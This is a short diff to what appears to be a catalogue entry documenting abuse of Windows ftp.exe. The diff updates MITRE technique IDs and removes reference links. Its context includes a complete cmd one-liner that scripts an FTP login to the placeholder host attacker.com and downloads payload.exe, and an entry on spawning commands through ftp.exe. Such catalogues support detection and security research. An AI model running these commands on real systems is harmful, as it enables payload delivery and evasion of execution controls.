@@ -9,8 +9,7 @@ Commands:
     Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
     Category: Execute
     Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreID: T1202
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
     Description: Download
@@ -18,7 +17,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\ftp.exe
